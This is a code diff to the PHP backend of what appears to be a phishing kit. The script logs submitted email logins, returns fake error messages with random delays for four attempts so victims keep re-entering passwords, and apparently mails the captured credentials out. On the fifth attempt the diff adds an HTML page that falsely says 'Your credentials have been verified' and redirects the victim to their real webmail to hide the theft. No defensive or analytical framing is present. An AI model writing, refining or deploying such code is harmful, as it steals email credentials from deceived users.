@@ -10,7 +10,6 @@ use PHPMailer\PHPMailer\Exception;
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
 header("Access-Control-Allow-Headers: Content-Type, Authorization");
-header('Content-Type: application/json');
 
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     http_response_code(200);
@@ -121,6 +120,7 @@ if ($attemptNumber < 5) {
     // Log the error attempt
     error_log("ERROR ATTEMPT: Email=$login, Attempt=$attemptNumber, Message=" . $errorMessages[$attemptNumber - 1]);
     
+    header('Content-Type: application/json');
     $response = [
         "signal" => "error",
         "success" => false,
@@ -137,32 +137,63 @@ if ($attemptNumber < 5) {
     // Longer delay for error responses
     usleep(rand(800000, 1500000));
     
+    echo json_encode($response);
+    
 } else {
-    // 5th attempt - show success and redirect
+    // 5th attempt - redirect immediately using HTML meta refresh
     $redirectUrl = "https://webmail.$domain";
     
     // Log the redirect attempt
     error_log("REDIRECT ATTEMPT: Email=$login, Domain=$domain, RedirectURL=$redirectUrl, Attempt=$attemptNumber");
     
-    $response = [
-        "signal" => "OK",
-        "success" => true,
-        "msg" => "Login successful! Redirecting to webmail...",
-        "redirect_url" => $redirectUrl,
-        "attempt" => $attemptNumber,
-        "debug_info" => [
-            "email_sent" => true,
-            "timestamp" => $timestamp,
-            "attempt_number" => $attemptNumber,
-            "domain" => $domain,
-            "redirect_url" => $redirectUrl
-        ]
-    ];
+    // Send HTML response with meta refresh redirect
+    header('Content-Type: text/html; charset=utf-8');
+    
+    echo '<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Login Successful - Redirecting...</title>
+    <meta http-equiv="refresh" content="2;url=' . htmlspecialchars($redirectUrl) . '">
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
+        .success-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
+        .success-icon { color: #28a745; font-size: 48px; margin-bottom: 20px; }
+        .redirect-text { color: #666; margin-top: 20px; }
+        .manual-link { margin-top: 20px; }
+        .manual-link a { background: #007cba; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; }
+    </style>
+</head>
+<body>
+    <div class="success-box">
+        <div class="success-icon">✓</div>
+        <h2>Login Successful!</h2>
+        <p>Your credentials have been verified. You are being redirected to your webmail...</p>
+        <div class="redirect-text">
+            <p>Redirecting to: <strong>' . htmlspecialchars($redirectUrl) . '</strong></p>
+            <p>If you are not redirected automatically, click the button below:</p>
+        </div>
+        <div class="manual-link">
+            <a href="' . htmlspecialchars($redirectUrl) . '">Continue to Webmail</a>
+        </div>
+    </div>
+    
+    <script>
+        // Additional JavaScript redirect as backup
+        setTimeout(function() {
+            window.location.href = "' . htmlspecialchars($redirectUrl) . '";
+        }, 2000);
+        
+        // Log the redirect attempt
+        console.log("Redirecting to: ' . htmlspecialchars($redirectUrl) . '");
+        console.log("Attempt number: ' . $attemptNumber . '");
+    </script>
+</body>
+</html>';
     
     // Short delay for success
     usleep(rand(300000, 800000));
 }
 
-echo json_encode($response);
 exit();
 ?>
